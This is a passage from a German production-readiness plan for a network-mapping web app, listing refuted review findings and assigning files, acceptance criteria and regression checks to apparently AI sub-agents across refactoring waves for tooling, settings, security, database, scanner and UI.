- **Was passiert:** Es fehlt ein Runbook mit WAL-sicherem Backup, Upgrade und Rollback, dazu Architekturübersicht, Bedrohungsmodell, Teststrategie und Release-Checkliste. FastAPI zeigt `/docs` und `/openapi.json`, hinter Anmeldung geschützt und offen nur bei `NETZ_AUTH_ENABLED=false`, ein eigenes Risiko ist das nicht.
- **Fix:** Neue Dateien `docs/05-betrieb.md` und `docs/06-architektur.md`, Bedrohungsmodell in `docs/03-sicherheit.md`, Release-Checkliste in `CONTRIBUTING.md`. `docs_url=None, openapi_url=None` entscheiden und dokumentieren, `web.py` trägt der Orchestrator. `.env.example` entsteht schon in W1.
- **Regressionstest:** `tests/test_docs.py::test_ops_docs_exist`
- **Hinweis:** Prüfer stufte von mittel auf niedrig herab.

### 7.10 Widerlegte Befunde (nicht erneut untersuchen)

Ganz oder teilweise widerlegte Behauptungen. Bei Teilwiderlegungen steht der bestätigte Rest im Katalog oben.

| ID          | Behauptung                                                                                                              | Warum widerlegt                                                                                                                                                                                       |
| ----------- | ----------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| C-11        | `run_once` schreibt im `finally` `next_scan = now` und zeigt einen falschen Countdown                                   | Benachrichtigung und Auto-Export laufen vor dem `finally`, `main()` setzt danach den echten Wert (`run.py:486-494`). Der Karenzwert des Healthchecks greift nicht. Toter Schreibzugriff ohne Wirkung. |
| C-12        | `normalize_mac` liefert unaufgefüllte oder Cisco-gepunktete MACs                                                        | Alle Erzeuger liefern schon aufgefülltes Kleinschreibung-Format: `/proc/net/arp`, `ip neigh`, TR-064 mit `.lower()`, SNMP mit `02x`. Nur latent, siehe Q-9.                                           |
| C-13 (Teil) | Ports über 65535 lösen `OverflowError` aus und brechen den Scan ab                                                      | `check_port('127.0.0.1', 70000)` liefert `None`, `scan_ports([22, 70000])` ergibt `[]`. Nur der Deckel von 1040 Ports bleibt.                                                                         |
| TL-2        | Ungesperrter Zugriff auf Sitzungen in `is_valid_session` kann abstürzen                                                 | `entry` ist eine lokale Referenz auf ein unveränderliches Tupel, `dict.get` ist unter der GIL atomar, Prune ändert das Tupel nicht. Nur ein Typ-Hinweis.                                              |
| TL-3        | Breites `except` um den base64-Decode ist ein Fehler                                                                    | Es kann nur `binascii.Error` oder `ValueError` auftreten, keine Verhaltensfolge. Das echte Verschlucken steht in `api.py:318-321`, siehe N-4.                                                         |
| K-1 (Teil)  | Lesen, Healthchecks und Logins scheitern allgemein nach etwa 31 s mit 500, bis zu 40 Anfragen erschöpfen den Threadpool | Der echte Scanner hält den Lock nur Millisekunden. 31 s braucht den Pfad aus K-2 mit langsamen OUI- und DNS-Antworten. Threadpool-Erschöpfung nicht beobachtet.                                       |
| K-2 (Teil)  | Die Haltezeit der Transaktion liegt leicht über 30 s                                                                    | Die Transaktion öffnet nur bei erfolgreicher Abfrage eines unbekannten Präfixes, normale Antworten brauchen unter 1 s, ein 429 schreibt nichts.                                                       |
| K-4 (Teil)  | Der erste `docker compose up` oder Upgrade zeigt regelmäßig einen Absturz                                               | Der Startversatz beträgt etwa 50 ms bei einem Fenster von Millisekunden. Die 2 von 30 stammen aus einem synchronisierten Teststart.                                                                   |
| K-9 (Teil)  | Falscher unhealthy-Status bei Lock-Wartezeiten                                                                          | Docker braucht 3 aufeinanderfolgende Zeitüberschreitungen zu je 5 s, Locks dauern Millisekunden.                                                                                                      |
| SF-1 (Teil) | Bei einem Ausfall der Erkennung entsteht ein Alarm- oder Ereignissturm                                                  | Offline-Übergänge lösen keine Benachrichtigung aus, Ereignisse entstehen einmal je Gerät. Nur eine Sammelmeldung nach der Aufbewahrung bleibt.                                                        |
| SF-3 (Teil) | Der Scan hängt in einem blockierenden Aufruf, ein gestorbener Scanner lässt den Container gesund                        | Kein unbegrenzter Aufruf gefunden, alle haben ein Timeout. Der Scanner ist PID 1, sein Tod beendet den Container.                                                                                     |
| SF-4 (Teil) | Ein Tippfehler in der Subnetz-Einstellung verengt den Scan still                                                        | Die API validiert Subnetze, Umgebungs-Subnetze werden in `discover.py:229` gewarnt, `config.py:91` parst `sites`.                                                                                     |
| F-15 (a)    | Speichern der Einstellungen setzt eine geänderte Sprache zurück                                                         | `setLang()` ruft `fillLangSelects()`, das `#st-lang` angleicht.                                                                                                                                       |
| Q-9 (Teil)  | Die Whitelist verfehlt Geräte wegen uneinheitlicher MAC-Normalisierung                                                  | `notify.is_whitelisted` normalisiert beide Seiten mit demselben `_norm_mac`.                                                                                                                          |
| Q-11 (Teil) | `login.user`, `login.pass`, `login.btn` sind unbenutzt                                                                  | `login.html:13-17` und `login.js:11-12` benutzen sie über `data-i18n`.                                                                                                                                |
| Q-7 (Teil)  | Build-Abhängigkeiten bleiben im Image                                                                                   | Es wird kein Compiler installiert, pip nutzt Hash-Wheels mit `--no-deps`.                                                                                                                             |
| Q-10 (Teil) | Nur etwa 26 `esc()`-Aufrufe in Templates                                                                                | Es sind 61 Vorkommen von `esc(`. Der Befund bleibt.                                                                                                                                                   |
| M19         | Mutant M19 (Auth von `GET /api/logs` entfernt) überlebt als echte Lücke                                                 | Äquivalent: `/api/logs` liegt nicht unter `TOKEN_PATHS`, die Middleware liefert weiter 401.                                                                                                           |
| S-13 (Teil) | Die Drossel lässt sich allgemein per `X-Forwarded-For` umgehen                                                          | Nur mit einem Proxy auf demselben Host, der den Header unverändert durchreicht. Übliche Proxys und der Docker-Betrieb sind nicht betroffen. Es bleibt die Abweichung zur Doku.                        |
| D-8         | `fastapi<1.0` und lockere Untergrenzen sind ein Mangel                                                                  | Der Deckel bei einer 0.x-Bibliothek ist vertretbar, das Lockfile pinnt, Dependabot meldet das 1.0-Release. Kein Mangel.                                                                               |
| D-10 (Teil) | `/docs` und `/openapi.json` sind ein eigenes Risiko                                                                     | Sie sind hinter der Anmeldung geschützt und nur bei `NETZ_AUTH_ENABLED=false` offen, dann ist ohnehin alles offen.                                                                                    |
| D-11        | `THIRD_PARTY.md` weicht von den mitgelieferten Dateien ab                                                               | Sie stimmt mit der Kopfzeile überein, Cytoscape 3.30.2 und MIT. Nur Lucide steht ohne Version, das ist kein Mangel.                                                                                   |

## 8. Wellen und Dateibesitz

Jede Welle endet mit Gate, Advisor und einem Commit. Jede Datei gehört in einer Welle genau einem Writer oder dem Orchestrator. Neue Testdateien trägt jeder Writer selbst ein, bestehende Testdateien stehen nur in der Zeile des Writers, der sie ändert. Zeilennummern und Dateien sind Stand `a63750f` und werden vor dem Start mit `grep -rn` geprüft.

Der Auftrag eines Writers soll höchstens etwa 25 Minuten dauern. Wo ein Auftrag größer wäre, steht er in zwei Zeilen.

### W0 Werkzeuge

- **Ziel:** Ein einheitliches Gate aus Format, Lint, Typen, Tests und Container-Prüfung auf uv-Basis, ohne Verhaltensänderung der Anwendung.
- **Befunde:** TL-6 (mit Q-15, D-9); Q-5; Q-6; Q-7; TL-7; D-6; D-7
- **Besonderheit:** Die Detailplanung steht direkt unter dieser Welle im Abschnitt "Welle 0 im Detail".

| Auftrag                    | Unteragent                               | Exklusive Dateien                                                                                                                                                                                                                                                                                                                                                                                           | Befunde                                         |
| -------------------------- | ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| Umstellung auf uv und Gate | Orchestrator allein                      | `pyproject.toml`, `uv.lock`, `requirements.in`, `requirements.txt`, `requirements-dev.in`, `requirements-dev.txt` (löschen), `Dockerfile`, `.github/workflows/*.yml`, `.github/dependabot.yml`, `scripts/gate.sh`, `eslint.config.mjs`, `package.json`, `CONTRIBUTING.md`, `README.md`, `README.en.md` (nur Abschnitte Supply chain und Development), `app/__init__.py`, `app/config.py` (nur Versionsfeld) | TL-6 (Q-15, D-9), Q-5, Q-6, Q-7, TL-7, D-6, D-7 |
| Formatierung               | Orchestrator, mechanisch, eigener Commit | die 19 Dateien unter `app/` und `tests/`, die `ruff format --check` meldet                                                                                                                                                                                                                                                                                                                                  | TL-6                                            |

**Abnahmekriterien**

- `scripts/gate.sh` ist lokal und in CI grün, auf Python 3.12 und 3.13.
- `grep -rn "1\.6\.16" app pyproject.toml` findet genau eine Stelle.
- `uv run pytest --co -q | tail -1` zeigt mindestens 230 Tests, keiner wurde gelöscht oder abgeschwächt.

**Nicht-Regression**

- Basislinie: 230 Tests grün, `node tests/ui_dom_check.mjs` mit 184 Prüfungen grün, CI-Job `docker` grün.

#### Welle 0 im Detail: Werkzeuge, uv und Gate

**Welle 0 ändert kein Verhalten der Anwendung.** Sie stellt Paketverwaltung und Prüfwerkzeuge so auf,
dass jede spätere Welle gegen dasselbe Gate läuft. Sie läuft vom Orchestrator allein oder mit einem
Writer, weil fast jede Datei darin eine Integrationsdatei ist.

**uv statt pip-tools** (Entscheidung des Auftraggebers, Abschnitt 5):

- **`pyproject.toml`:**
  - `[project] dependencies` aus den Bereichen in `requirements.in`.
  - `[dependency-groups] dev`: `pytest`, `pytest-cov`, `ruff`, `mypy`, `hypothesis`, `pip-audit`.
  - Build-Backend `hatchling` mit `[tool.hatch.version] path = "app/__init__.py"`, damit die Version
    nur noch in `app/__init__.py` steht (Befund Q-5). `app/config.py` liest `app.__version__`,
    statt eine eigene Kopie zu halten.
  - `requires-python = ">=3.12"` bleibt.
- **`uv.lock`** wird erzeugt und committet. Er enthält die Hashes. `requirements.in`,
  `requirements.txt`, `requirements-dev.in` und `requirements-dev.txt` werden gelöscht, sobald
  Dockerfile und CI umgestellt sind.
- **Dockerfile** wird zweistufig:
  - Stufe `build` kopiert `uv` aus `ghcr.io/astral-sh/uv` per Digest und führt
    `uv sync --frozen --no-dev --no-editable` aus.
  - Stufe `runtime` übernimmt nur `/app/.venv` und `app/`.
  - `apt-get upgrade` entfällt (Befund Q-7). Es macht den Digest-Pin des Basis-Images wertlos,
    weil jeder Build andere Pakete zieht. Aktualität kommt über Dependabot-Digest-Updates.
  - Basis-Digest auf den aktuellen Stand von `python:3.12-slim` heben (Befund D-6).
- **CI** (`.github/workflows/ci.yml`, `release.yml`, `main-scan.yml`):
  - `astral-sh/setup-uv` per SHA gepinnt, `uv sync --frozen`.
  - Python-Matrix `3.12` und `3.13`.
  - Gate-Schritte wie in `scripts/gate.sh` (unten).
  - `uv export --frozen --no-hashes --format requirements-txt | uvx pip-audit -r /dev/stdin`
    als eigener Schritt.
  - `release.yml` prüft, dass der Tag gleich `app.__version__` ist. Weitere Versionsstellen gibt es
    danach nicht mehr.
- **Dependabot:** Ökosystem `pip` durch `uv` ersetzen. `npm`, `docker` und `github-actions`
  bleiben. Für Dinge, die Dependabot nicht sieht (Cytoscape in `app/static/vendor/`, gitleaks-Version
  im Workflow, Trivy-Image in `scripts/trivy.sh`), kommt eine Tabelle "Manuell zu pflegen" mit
  Prüfbefehl in `CONTRIBUTING.md`.
- **README, README.en, CONTRIBUTING:** Abschnitte "Supply chain" und "Development" auf uv umschreiben
  (`uv sync`, `uv run pytest`, `uv lock --upgrade`).

**Prüfwerkzeuge** (Ausbau in Stufen, jede hält CI grün):

| Stufe | Werkzeug                | Einstellung                                                                                                                              | Welle  |
| ----- | ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | ------ |
| 1     | `ruff format`           | einmal repo-weit anwenden, danach `--check` im Gate                                                                                      | W0     |
| 1     | `ruff check`            | zusätzlich `B`, `UP`, `SIM`, `S`, `BLE`, `RUF`, `DTZ`, `ASYNC`, `C90` (max 15); ignoriert `B008` (FastAPI `Depends`), `S101` in `tests/` | W0     |
| 2     | `mypy`                  | `check_untyped_defs`, `warn_return_any`, `warn_unused_ignores`, `strict_optional`; Ziel `app/`                                           | W0     |
| 3     | `eslint` 9, Flat Config | `js/recommended`, gemeinsame Globals (`I18N`, `LANGS`, `iconUri`, `cytoscape`) deklariert                                                | W0     |
| 4     | `mypy --strict`         | modulweise für `app/` nach den Refactor-Wellen, `DeviceRow` als `TypedDict`                                                              | W7     |
| 5     | Coverage-Schwelle       | `pytest --cov=app --cov-branch --cov-fail-under=<Ist-Wert>`, in jeder Welle angehoben                                                    | W0..W8 |

- **Neue Lint-Regeln, keine Autofixes in Feature-Dateien:** In Welle 0 werden die neuen
  ruff-Regeln eingeschaltet und die Treffer behoben, aber nur mit `ruff check --fix` für sichere
  Fixes und mit Lesen jedes Diffs. Ein übereifriger Autofix hat schon eine Typ-Zusicherung entfernt
  und einen stillen Fehler ausgeliefert. Unsichere Fixes (`--unsafe-fixes`) sind verboten.
- **Regeln, die ein Writer für "grün" abschalten will, bleiben an.** Eine Ausnahme braucht einen
  `# noqa: <Regel>  <Grund>` an der Zeile, nie eine globale Ignore-Zeile.
- **Gate-Skript `scripts/gate.sh`** führt alle Prüfungen in der Reihenfolge aus Abschnitt 9.5 aus,
  bricht beim ersten Fehler ab und gibt am Ende eine Zeile je Prüfung aus. CI ruft dasselbe Skript.

Abnahme Welle 0:

- `scripts/gate.sh` ist lokal und in CI grün, auf Python 3.12 und 3.13.
- `docker compose build` und der CI-Job `docker` sind grün.
- `grep -rn "1\.6\.16" app pyproject.toml` findet genau eine Stelle (`app/__init__.py`).
- Die 230 bestehenden Tests laufen weiter, keiner wurde gelöscht oder abgeschwächt:
  `uv run pytest --co -q | tail -1` zeigt mindestens 230.
- `docs/produktionsreife/checkliste.html`, `STAND.md` und `ARCHIV.md` existieren.

### W1 Bausteine: Einstellungen, MAC-Normalisierung, Logging

- **Ziel:** Ein einziges Einstellungsschema mit einheitlicher Zusammenführung aus Umgebung und Datenbank, eine MAC-Normalisierung und ein Logger-Baum, auf denen alle späteren Wellen aufbauen.
- **Befunde:** S-8; S-7; S-9; C-1 (mit K-7); Q-1; N-2; C-2; C-3; D-2; Q-2; Q-8; SF-4; Q-9 (mit C-15); N-3
- **Verschoben oder geteilt:** S-7 von W2 nach W1: gleiche PATCH-Logik wie S-8 und S-9, sonst würde W2 dieselben Zeilen noch einmal umbauen.
- **Verschoben oder geteilt:** C-3 und S-8 haben einen Frontend-Teil in W5, der Eintrag zählt in W1.

Schnittstellen, die in den Briefen stehen, damit Writer parallel arbeiten können:

- `app/config.py`: `effective_settings(conn, base: Settings) -> Settings`, wirft nie, loggt ungültige Werte mit WARNING.
- `app/settings_schema.py`: `FIELDS: dict[str, SettingField]` mit `type`, `minimum`, `maximum`, `secret`, `exposed`, `patchable`, `scanner`.
- `app/netutil.py`: `normalize_mac(value: str) -> str | None`, `normalize_mac_key(value: str) -> str`, das `ip:`-Schlüssel unverändert lässt, und `is_mac(value: str) -> bool`. `oui.normalize_mac` bleibt als dünner Aufruf bestehen, damit `run.py` nicht umgeschrieben werden muss.
- `app/validation.py`: `parse_subnets(text) -> list[str]`, `parse_sites(text) -> dict[str, str]`, `parse_endpoint(text) -> str`, `parse_whitelist(text) -> list[str]`, jeweils `ValueError` mit der bisherigen deutschen Meldung.

| Auftrag                      | Unteragent                 | Exklusive Dateien                                                                                                                                                                                                                | Befunde                                                                         |
| ---------------------------- | -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| Schema und Zusammenführung   | W1-A1                      | `app/settings_schema.py` (neu), `app/config.py`, `app/scanner/run.py`, `tests/test_settings_schema.py` (neu)                                                                                                                     | Q-1, C-1 (Backend), C-2, N-2, SF-4                                              |
| Einstellungs-API und Compose | W1-A2                      | `app/api.py`, `app/validation.py` (neu), `docker-compose.yml`, `.env.example` (neu), `tests/test_settings_api.py` (neu)                                                                                                          | Q-2, C-3 (Backend), S-7, S-8, S-9, D-2, Q-9 (nur C-15, Geräte-Pfad in `api.py`) |
| Netz-Bausteine und Logging   | W1-B                       | `app/netutil.py` (neu), `app/scanner/oui.py`, `app/scanner/notify.py`, `app/scanner/tr064.py`, `app/scanner/discover.py`, `app/scanner/mdns.py`, `app/logsetup.py`, `tests/test_netutil.py` (neu), `tests/test_logging.py` (neu) | Q-9, N-3, Q-8                                                                   |
| Integration                  | Orchestrator (Integration) | `app/web.py` (`create_app` lädt `effective_settings` beim Start), `CHANGELOG.md`, `STAND.md`; Handbuchänderungen nur als Notiz für W8                                                                                            | C-1 (Aufrufstelle)                                                              |

**Abnahmekriterien**

- `uv run pytest tests/test_settings_schema.py tests/test_settings_api.py tests/test_netutil.py tests/test_logging.py -q` ist grün, jeder neue Test war vor dem Fix nachweislich rot.
- Ein zweites `create_app` auf demselben Datenverzeichnis liefert nach PATCH `sites` dieselben Sites und `test_web_applies_stored_settings_at_startup` belegt das.
- `GET /api/settings` enthält keinen Klartext für `snmp_community`, `notify_*` und `fritz_*` mit Benutzerinfo, `auth_enabled` ist nicht patchbar.
- `docker compose --env-file <Testdatei> config` zeigt `NETZ_LANG`, `NETZ_TR064_INSECURE_TLS`, `NETZ_SQLITE_JOURNAL` und `NETZ_SITES`.
- `grep -rn 'getLogger("netmap' app` findet nichts mehr, `scripts/gate.sh` ist grün.

**Nicht-Regression**

- W0: Gate, 230 Tests, eine Versionsstelle.
- Alle bisherigen Fehlermeldungen von `PATCH /api/settings` bleiben wörtlich gleich.

### W2 Sicherheit

- **Ziel:** Alle bestätigten Sicherheitsbefunde schließen, die Token-Pfade absichern und die Schreibrouten gegen Rückfall schützen.
- **Befunde:** S-1 (mit C-7, T-5); S-6; S-2; S-3; S-4; S-5; S-10; S-11; S-12; S-13; S-14; N-5; S-15; S-16; S-17; C-10; T-1
- **Verschoben oder geteilt:** S-7, S-8, S-9 sind nach W1 gezogen, weil sie dieselbe PATCH-Logik betreffen.
- **Verschoben oder geteilt:** T-5 ist in S-1 (mit C-7) aufgegangen: dieselben Tests prüfen den Token-Scope.

Schnittstellen, die in den Briefen stehen, damit Writer parallel arbeiten können:

- `app/api.py`: `token_allows(row: dict, dev: dict) -> bool`, `_token_filters(...)` gibt Listen zurück, `db.list_devices(..., subnets: list[str], categories: list[str])`.
- `app/exporters.py`: `build_pdf(..., image: bytes | None)` lehnt Bilder über 16 Megapixel mit `ValueError` ab.

| Auftrag                                     | Unteragent                 | Exklusive Dateien                                                                                                                                                                                                 | Befunde                                                                |
| ------------------------------------------- | -------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| Token-Scope, Exporte und öffentliche Fläche | W2-A                       | `app/api.py`, `app/exporters.py`, `tests/test_token_scope.py` (neu), `tests/test_token_routes.py` (neu), `tests/test_export_security.py` (neu), `tests/test_public_surface.py` (neu), `tests/test_api.py`         | S-1 (C-7, T-5), C-10, S-6 (Bildgrenze), S-3, S-10 (`api.py`-Teil), T-1 |
| Anmeldung und Prozess                       | W2-B                       | `app/auth.py`, `app/security.py`, `app/__main__.py`, `app/logsetup.py`, `docker/entrypoint.sh`, `docker-compose.yml` (nur `mem_limit`), `tests/test_login_race.py` (neu), `tests/test_process_hardening.py` (neu) | S-4, S-5, S-12, S-13, S-17, S-6 (`mem_limit`)                          |
| Scanner-Eingänge                            | W2-C                       | `app/scanner/tr064.py`, `app/scanner/oui.py`, `app/scanner/names.py`, `tests/test_scanner_inputs.py` (neu)                                                                                                        | S-2, S-11, S-14, N-5, S-15                                             |
| Integration                                 | Orchestrator (Integration) | `app/web.py` (S-10: `PUBLIC_PATHS` und `TOKEN_PATHS`, S-16: Origin-Prüfung), `tests/test_csrf_origin.py` (neu), `CHANGELOG.md`, `STAND.md`                                                                        | S-10 (`web.py`-Teil), S-16                                             |

**Abnahmekriterien**

- `uv run pytest tests/test_token_scope.py tests/test_token_routes.py tests/test_export_security.py tests/test_public_surface.py tests/test_login_race.py tests/test_process_hardening.py tests/test_scanner_inputs.py tests/test_csrf_origin.py -q` grün, vorher rot nachgewiesen.
- Mutanten B2, B3 und M11 werden jetzt getötet: Entfernen von `Depends(require_auth)` an `PATCH /api/device` oder `POST /api/devices/connect` und Ignorieren des Subnetz-Scopes lassen mindestens einen Test fehlschlagen.
- `curl -s 127.0.0.1:<Port>/api/meta` ohne Login liefert 401, `/api/health` nur `{"status":"ok"}`.
- Ein PDF mit 9000 mal 9000 Pixeln wird mit 422 abgelehnt, der RSS des Web-Prozesses bleibt unter 200 MB.
- `scripts/gate.sh` und der Container-Prüfschritt mit Hardening und Smoke-Test sind grün, `ls -l data/` zeigt keine weltlesbaren Dateien.

**Nicht-Regression**

- W1: Einstellungen aus der Datenbank wirken im Web und im Scanner, `GET /api/settings` ohne Secrets.
- Embed-Ansicht funktioniert weiter mit gültigem Token: Listen, Exporte, `/api/meta` mit `?token=`.

### W3 Datenbank und Nebenläufigkeit

- **Ziel:** Keine Nutzerdaten gehen beim Start oder bei einem Fehler verloren, und Web und Scanner stören sich nicht mehr gegenseitig an der SQLite-Datei.
- **Befunde:** K-3 (mit C-14); K-1; K-2; N-1; C-6; K-5; K-4; K-8; K-12; K-6; K-10 (mit K-11); T-10
- **Verschoben oder geteilt:** K-9 ist nach W4 gezogen und mit SF-3 zusammengelegt: gleiche Behebung, braucht die Spalten aus SF-2.
- **Verschoben oder geteilt:** Die Spalten `last_error`, `last_error_at`, `consecutive_failures` und `scan_started_at` entstehen schon in W3 mit der neuen Migration (K-4), damit die Writer in W4 nicht auf dieselbe Migration warten.

Schnittstellen, die in den Briefen stehen, damit Writer parallel arbeiten können:

- Neues Modul `app/dedupe.py`: `merge_placeholders(conn) -> int`, `blank_stale_ip(conn, ip: str, keep_mac: str) -> int`. `db.init_db` und `db.upsert_device` rufen diese Funktionen auf.
- `app/db.py`: `read_snapshot(conn)` als Kontextmanager, `set_oui_cache` committet selbst.

| Auftrag                    | Unteragent                 | Exklusive Dateien                                                                                                                   | Befunde                                                                                                                   |
| -------------------------- | -------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| Datenbank-Kern             | W3-A1                      | `app/db.py`, `tests/test_db_concurrency.py` (neu), `tests/test_db.py`                                                               | K-1, K-2, K-4 (mit neuen Scanzustands-Spalten), K-6, K-10 und K-11 (`db.py`-Teil), K-12, C-6, K-3 und N-1 (Aufrufstellen) |
| Zusammenführung nach IP    | W3-A2                      | `app/dedupe.py` (neu), `tests/test_dedupe.py` (neu)                                                                                 | K-3 (C-14), N-1                                                                                                           |
| Scanner-Lauf               | W3-B                       | `app/scanner/run.py`, `docker-compose.yml` (nur `init: true`), `tests/test_scanner_loop.py` (neu)                                   | K-5, K-8 (Signal-Handler), K-10 (`BEGIN IMMEDIATE` in `apply_scan`)                                                       |
| Export und Migrationstests | W3-C                       | `app/exporters.py`, `tests/test_migrations.py` (neu), `tests/test_export_atomic.py` (neu), `tests/fixtures/` (neu, Alt-Datenbanken) | T-10, K-8 (atomares Schreiben), K-11 (`exporters.py`-Teil)                                                                |
| Integration                | Orchestrator (Integration) | `CHANGELOG.md`, `STAND.md`, Notiz für W8: Handbuch Zeilen 250 und 395 beschreiben die Zusammenführung falsch                        | K-3                                                                                                                       |

**Abnahmekriterien**

- `uv run pytest tests/test_dedupe.py tests/test_db_concurrency.py tests/test_migrations.py tests/test_export_atomic.py tests/test_scanner_loop.py -q` grün, vorher rot nachgewiesen.
- Zwei echte MACs auf einer IP bleiben nach `init_db` beide erhalten, Notiz und Layout unverändert und `test_two_real_macs_same_ip_are_kept` belegt das.
- Eine Datenbank aus einer Fixture von v1.0 lässt sich öffnen, Token bleiben gültig, ein zweites `init_db` ändert nichts.
- `docker compose stop netmap-scanner` beendet den Scanner in unter 3 Sekunden ohne SIGKILL.
- `scripts/gate.sh` grün.

**Nicht-Regression**

- W1 und W2 gelten weiter, insbesondere der Token-Scope und die Einstellungen aus der Datenbank.
- Beim ersten Start einer neuen Datenbank erscheint genau einmal das Schema, ohne Absturzprotokoll.

### W4 Scanner und stille Fehler

- **Ziel:** Der Scanner liefert korrekte Daten, scheitert hörbar und löscht keine Geräte bei einem Ausfall der Erkennung.
- **Befunde:** C-4; SF-1; SF-2; SF-5; C-5; C-8; C-9; SF-3 (mit K-9); C-13; SF-8 (mit TL-1); SF-7; N-4; T-2; T-3; T-6
- **Verschoben oder geteilt:** K-9 aus W3 mit SF-3 zusammengelegt.
- **Verschoben oder geteilt:** SF-5 und SF-2 haben einen Anzeige-Teil in W5 mit Zustellstatus und Fehleranzeige im Scanstatus.
- **Verschoben oder geteilt:** T-2, T-3 und T-6 sind Testlücken, werden aber hier mit den zugehörigen Scanner-Fixes in einem Writer-Auftrag geschrieben.

Schnittstellen, die in den Briefen stehen, damit Writer parallel arbeiten können:

- `db.get_scan_state(conn)` liefert `last_error`, `last_error_at`, `consecutive_failures`, `scan_started_at`, die Spalten legt W3 an.
- `run_once(settings, conn) -> dict` behält Signatur und Rückgabeform, W4-D schreibt dagegen.
- `notify.notify_new_devices(...) -> bool`, `False` bei HTTP ab 300 oder Verbindungsfehler.

| Auftrag                          | Unteragent                 | Exklusive Dateien                                                                                                                                                                                                                       | Befunde                                                                       |
| -------------------------------- | -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| Erkennungspfade                  | W4-A                       | `app/scanner/discover.py`, `app/scanner/snmp.py`, `app/scanner/ports.py`, `app/scanner/topology.py`, `app/scanner/mdns.py`, `app/scanner/names.py`, `app/scanner/oui.py`, `app/scanner/tr064.py`, `tests/test_discovery_paths.py` (neu) | C-8, C-9, C-13, SF-8 (TL-1)                                                   |
| Scan-Lauf und Zustand            | W4-B1                      | `app/scanner/run.py`, `app/db.py` (nur `upsert_device`), `tests/test_merge_sources.py` (neu), `tests/test_scan_state.py` (neu)                                                                                                          | C-4, C-5, SF-1, SF-2 (Schreibseite), SF-3 (Schreibseite), SF-5 (Aufrufstelle) |
| Status, Meldungen und PDF-Fehler | W4-B2                      | `app/api.py`, `app/healthcheck.py`, `app/scanner/notify.py`, `tests/test_health_status.py` (neu), `tests/test_notify.py` (neu), `tests/test_pdf_errors.py` (neu)                                                                        | SF-2 (Leseseite), SF-3 mit K-9 (Leseseite), SF-5, N-4                         |
| Tests und Entrypoint             | W4-D                       | `tests/test_scanner_loop.py`, `tests/test_retention.py` (neu), `tests/test_auto_export.py` (neu), `docker/entrypoint.sh`, `tests/test_hardening.py`                                                                                     | T-2, T-3, T-6, SF-7                                                           |
| Integration                      | Orchestrator (Integration) | `CHANGELOG.md`, `STAND.md`                                                                                                                                                                                                              | -                                                                             |

**Abnahmekriterien**

- `uv run pytest tests/test_discovery_paths.py tests/test_merge_sources.py tests/test_scan_state.py tests/test_health_status.py tests/test_notify.py tests/test_pdf_errors.py tests/test_scanner_loop.py tests/test_retention.py tests/test_auto_export.py -q` grün.
- Die Mutanten R1, R2, R3, F4, F5, F6 und F7 aus der Tabelle in Abschnitt 7.6 werden getötet: jeder Mutant lässt mindestens einen Test rot werden.
- Mit `ip` und `ping` als nicht vorhanden gepatcht bleiben 5 online gemeldete Geräte online und es gibt eine ERROR-Zeile und `test_empty_discovery_does_not_mark_offline_or_retain` belegt das.
- `GET /api/scan/status` zeigt nach drei fehlgeschlagenen Läufen `last_error` und `consecutive_failures=3`, der Healthcheck meldet unhealthy.
- `scripts/gate.sh` grün, Coverage von `app/scanner/run.py` mindestens 90 Prozent.

**Nicht-Regression**

- W3: keine Zusammenführung echter MACs, Rollback bei Fehler im Scan, Scanner reagiert auf SIGTERM.
- W2: Token-Scope, Login-Drossel, TR-064 ohne Klartext-Rückfall.

### W5 Oberfläche

- **Ziel:** Fehler werden in der Oberfläche sichtbar, Eingaben und Ansicht bleiben bei Aktualisierungen erhalten, Tastaturbedienung, Kontrast und Embed-Ansicht stimmen.
- **Befunde:** F-3 (mit SF-6); F-4; F-2; F-5; F-6; F-8; F-9; Q-10; F-1; F-7; F-10 (mit F-11); F-12; F-13 (mit F-14, Q-11); F-15; F-16; TL-4; D-5
- **Besonderheit:** `app/static/app.js` ist eine einzige Datei und kann nur einem Writer gehören. W5 läuft deshalb in zwei Runden mit je einem Gate: Runde 1 mit Fehlerschicht und Zustand, Runde 2 mit Bedienbarkeit und Texten. Beide Runden ergeben einen gemeinsamen Wellen-Commit nach dem Advisor.
- **Verschoben oder geteilt:** Q-10 wird nur zur Hälfte umgesetzt: `api.js` entsteht, die Zerlegung in ES-Module bleibt ausgelassen und ist eine Entscheidung für nach v1.7.
- **Verschoben oder geteilt:** Vier Befunde haben einen Frontend-Teil in W5 und zählen in ihrer Heimatwelle: C-3, S-8 mit leerem Secret-Feld und Löschen, C-10 mit 0 oder leer als `null`, SF-5 mit dem Zustellstatus.

Schnittstellen, die in den Briefen stehen, damit Writer parallel arbeiten können:

- `app/static/api.js`: `apiJson(path, options) -> Promise<object>` wirft `ApiError` mit `status` und `detail`, `api(path, options)` bleibt für Rohantworten.
- Neue i18n-Schlüssel, die der Orchestrator in `app/static/i18n.js` einträgt: `msg.rejected`, `msg.network`, `msg.offline`, `btn.clear_secret`, `settings.secret_configured`, `d.native_ip_only`, `d.nic`, `msg.save_failed`, `scan.title`, `sel.count`.

| Auftrag                            | Unteragent                        | Exklusive Dateien                                                                                                                                                                                                                | Befunde                                                                                                     |
| ---------------------------------- | --------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| Runde 1: Fehlerschicht und Zustand | W5-R1                             | `app/static/app.js`, `app/static/api.js` (neu), `tests/ui/api_errors.mjs` (neu), `tests/ui/table_edit.mjs` (neu), `tests/ui/layout_positions.mjs` (neu), `tests/ui/map_refresh.mjs` (neu), `tests/ui/settings_form.mjs` (neu)    | F-3 (SF-6), F-4, F-1, F-2, F-5, F-6, C-3 (Frontend), TL-4, Q-10 (`api.js`), S-8 (Frontend), C-10 (Frontend) |
